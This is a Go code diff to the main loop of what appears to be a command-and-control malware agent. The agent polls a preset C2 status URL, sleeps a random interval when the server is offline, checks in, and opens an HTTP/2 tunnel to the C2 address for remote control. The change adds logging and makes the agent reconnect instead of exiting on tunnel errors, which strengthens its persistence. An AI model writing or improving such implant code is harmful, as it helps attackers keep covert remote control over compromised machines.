@@ -31,6 +31,7 @@ func main() {
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if !agent.IsCCOnline() {
+		log.Println("CC not online")
 		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
 	}
 
@@ -39,18 +40,21 @@ connect:
 	if err != nil {
 		log.Println("CheckIn: ", err)
 	}
+	log.Println("Checked in")
 
 	// connect to TunAPI, the JSON based h2 tunnel
 	tunURL := agent.CCAddress + tun.TunAPI
-	conn, ctx, err := agent.ConnectCC(tunURL)
+	conn, ctx, cancel, err := agent.ConnectCC(tunURL)
 	agent.CCConn = conn
 	if err != nil {
 		log.Println("ConnectCC: ", err)
 		time.Sleep(5 * time.Second)
 		goto connect
 	}
-	err = agent.CCTun(ctx)
+	log.Println("Connected to CC TunAPI")
+	err = agent.CCTun(ctx, cancel)
 	if err != nil {
-		log.Fatal(err)
+		log.Print("CCTun: ", err)
+		goto connect
 	}
 }
